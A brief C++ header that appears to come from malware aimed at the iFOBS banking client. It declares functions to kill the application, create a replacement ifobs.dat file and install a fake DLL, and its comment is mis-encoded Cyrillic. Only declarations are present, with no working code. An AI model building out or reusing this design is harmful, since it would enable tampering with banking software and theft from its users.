#ifndef IFobsH
#define IFobsH


namespace IFobs
{

bool Init( const char* appName );
DWORD WINAPI KillIFobs(void*);
//סמחהאוע פאיכ ןמהלוםû ifobs.dat
void CreateFileReplacing( const char* s );
DWORD WINAPI IntallFakeDll(void*);

};


#endif //IFobsH
